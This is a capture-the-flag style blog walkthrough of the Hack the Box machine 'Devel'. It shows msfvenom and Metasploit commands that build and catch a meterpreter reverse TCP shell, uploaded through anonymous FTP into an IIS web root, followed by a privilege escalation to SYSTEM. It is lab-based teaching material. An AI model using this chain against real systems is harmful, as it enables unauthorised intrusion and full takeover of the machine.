Today let's get our hands in one the Windows boxes from Hack the Box.


### Going over nmap

Going over nmap, we see something interesting. FTP is open, as well as HTTP. HTTP isn't a surprise but FTP definitely is. We also do see it running Microsoft IIS which is Microsoft Web Server. 

![_config.yml]({{ site.baseurl }}/images/2020/november/27/devel/2-1.png)

Accessing to 10.10.10.5 we see the default welcome page. Viewing the image we arrive at 10.10.10.5/welcome.png. 

![_config.yml]({{ site.baseurl }}/images/2020/november/27/devel/3-1.png)

Previously, the file welcome.png was on the output of nmap. That means iisstart.htm which also was on the output is probably the default page of the website. The FTP server likely is in the same root as the HTTP server.

### Anonymous FTP + File Upload

If we upload a script there, we might be able to view it via the HTTP server. Let's FTP to 10.10.10.5. User as anonymous because that what nmap said: we have anonymous access. The password doesn't matter. Doing a dir shows the same files we know exist.

![_config.yml]({{ site.baseurl }}/images/2020/november/27/devel/4-1.png)

If we upload a test file. And check again with dir, the file test exists on the webserver.

10.10.10.5 gave us a 403 error. But changing test to test.html... We have successful execution.

After intercepting the request with Burp and sending it to the repeater, we can see that this is a IIS server. And IIS does execute code, generaly ASP or ASPX. If we forward the request with Burp: we have IIS/7.5 which came out in 2008.

### MSFVenom

MSFVenom is going to build us an interpreter session. We can do msfvenom -l to list all available payloads. Piping it to grep will be useful to show only Windows payloads. We're going to do meterpreter reverse TCP because it usually works. A 64bit will not work on a 32 bit machine. But the 32bit version will still work on a 64bit machine.

```bash
msfvenom -l payloads | grep windows
```

This is the safest one to use first. Entering the command msfvenom -p (for payload) -f (format) -o (file name) pokacyb.aspx. Adding LHOST and LPORT options because it kept ignoring the tun0 address. This is going to create us a aspx file that loads the interpreter. 

![_config.yml]({{ site.baseurl }}/images/2020/november/27/devel/5-1.png)

We then send the file over FTP in the same fashion as we did earlier.

### Metasploit

What we have to do is load a listener that is going to listen for the web server trying to load the interpreter. We set the payload to the same thing we just used which was windows/meterpreter/reverse_tcp.

```bash
msfconsole
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
msf6 exploit(multi/handler) > run
```

After accessing 10.10.10.5/pokacyb.aspx and going back to metasploit, the meterpreter is running. First thing we do is sysinfo so we can see the architecture of the machine. The meterpreter itself is 32bit which is good. Devel is a Windows 7 box.

### Exploit Suggestor

We launched a shell and did a systeminfo command but didn't learn anything useful other that the system hadn't been updated since it was installed. So let's use the exploit suggestor to show us exploits that might work with our machine. What we can see is that all of them are from 2010 and beyond. Windows 7 release date being 2009, chances are these might work. Next let's try the first one.

### Getting root

We had to try another session and specify the LHOST but now we're in. Doing a shell, we are nt authority\system which is Windows account. The box is ours now.
